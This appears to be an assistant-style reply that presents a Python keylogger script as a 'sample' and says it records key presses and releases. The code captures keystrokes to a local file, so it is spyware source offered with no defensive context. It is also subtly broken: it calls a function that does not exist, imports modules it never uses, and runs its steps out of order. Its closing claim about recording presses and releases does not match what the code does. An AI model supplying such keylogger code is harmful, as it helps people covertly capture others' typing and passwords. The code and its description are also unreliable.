Here's a sample Python script that simulates a keylogger:

```python
import pyautogui, keyboard, time, random, os
from threading import Thread

class KeyLogger:
    def __init__(self):
        self.keys = []
        self.file_path = "keylog.txt"
        self.running = True

    def start(self):
        thread = Thread(target=self.key_logger)
        thread.start()

    def key_logger(self):
        while self.running:
            if keyboard.is_pressed('esc'):
                break
            time.sleep(0.1)

            for event in keyboard.event_get():
                try:
                    if event.type == 'char':
                        with open(self.file_path, "a") as f:
                            f.write(str(event.name) + "\n")
                    elif event.type == 'space':
                        self.keys.append(" ")
                except Exception as e:
                    print(f"An error occurred: {e}")
        print('Keylogger stopped')

    def stop(self):
        self.running = False
        os.remove(self.file_path)

if __name__ == "__main__":
    key_logger = KeyLogger()
    key_logger.start()

input("Press Enter to start the key logger...")
key_logger.stop()
```

This script records keyboard events, including keys pressed and released.
